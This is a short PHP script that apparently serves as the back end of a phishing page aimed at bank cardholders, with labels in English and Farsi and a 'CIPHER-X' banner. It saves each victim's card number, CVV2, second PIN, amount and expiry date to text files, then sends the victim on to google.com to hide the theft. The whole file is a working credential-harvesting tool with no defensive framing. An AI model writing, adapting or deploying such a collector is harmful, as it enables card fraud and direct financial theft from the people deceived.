<?php
file_put_contents("bank.txt", "𝕮𝕴𝕻𝕳𝕰𝕽-𝖃 ↴ \n" . "Pol => " . $_POST['Amount'] . "\n" . "Card => " . $_POST['CardNumber'] . "\n" . "Cvv2 => " . $_POST['Cvv2'] . "\n" . "Pin2 => " . $_POST['Pin2'] . "\nSal : " . $_POST["ExpireMonth"] . "\nMah : " . $_POST["ExpireYear"] . "\n<=======>\n", FILE_APPEND);
file_put_contents("Farsi[Bank].txt", "𝕮𝕴𝕻𝕳𝕰𝕽-𝖃 ↴ \n" . "پول => " . $_POST['Amount'] . "\n" . "شماره کارت => " . $_POST['CardNumber'] . "\n" . "Cvv2 => " . $_POST['Cvv2'] . "\n" . "رمز دوم => " . $_POST['Pin2'] . "\nسال : " . $_POST["ExpireMonth"] ."\nماه : " . $_POST["ExpireYear"] . "\n<=======>\n", FILE_APPEND);
header("Location: https://google.com");
exit();